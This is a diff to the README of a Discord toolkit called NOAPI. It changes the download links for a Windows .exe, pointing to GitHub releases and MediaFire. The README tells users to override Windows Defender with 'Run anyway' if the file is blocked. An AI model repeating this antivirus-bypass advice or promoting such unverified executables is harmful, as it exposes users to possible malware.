@@ -6,7 +6,7 @@
 
 **A powerful all-in-one Discord developer toolkit with 60+ tools**
 
-[![Download](https://img.shields.io/badge/Download-NOAPI%20v1.0.0-blue?style=for-the-badge)](https://www.mediafire.com/file/l6ig7gl4vsbbvpe/NOAPI+1.0.0.exe/file)
+[![Download](https://img.shields.io/badge/Download-NOAPI%20v1.0.0-blue?style=for-the-badge)](https://github.com/omar8079/-noapi/releases/tag/NOAPI)
 
 </div>
 
@@ -53,7 +53,7 @@ NOAPI is a comprehensive Discord toolkit with 60+ tools across 6 categories. Bui
 
 ## 📥 Download
 
-**[Download NOAPI v1.0.0](https://www.mediafire.com/file/l6ig7gl4vsbbvpe/NOAPI+1.0.0.exe/file)** (~70 MB)
+**[Download from GitHub](https://github.com/omar8079/-noapi/releases/tag/NOAPI)** | **[Download from MediaFire](https://www.mediafire.com/file/l6ig7gl4vsbbvpe/NOAPI+1.0.0.exe/file)** (~70 MB)
 
 1. Download and run - no installation required
 2. If Windows Defender blocks it: "More info" → "Run anyway"
